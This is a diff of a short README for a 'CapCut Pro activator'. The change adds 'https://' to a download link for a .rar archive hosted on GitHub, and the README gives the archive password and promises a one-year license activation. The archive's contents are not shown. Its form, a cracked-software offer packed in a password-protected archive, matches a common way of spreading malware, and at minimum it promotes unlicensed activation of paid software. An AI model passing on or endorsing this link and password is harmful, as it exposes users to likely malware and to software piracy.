@@ -1,6 +1,6 @@
 # <h1 align="center">CapCut Pro activator</h1>
 
-# [DOWNLOAD](github.com/MapeSoup/Capcut-pro-activator/releases/download/v.5.1/Capcut_PRO.rar)
+# [DOWNLOAD](https://github.com/MapeSoup/Capcut-pro-activator/releases/download/v.5.1/Capcut_PRO.rar)
 # Archive password: 2025
 
 One year license activation
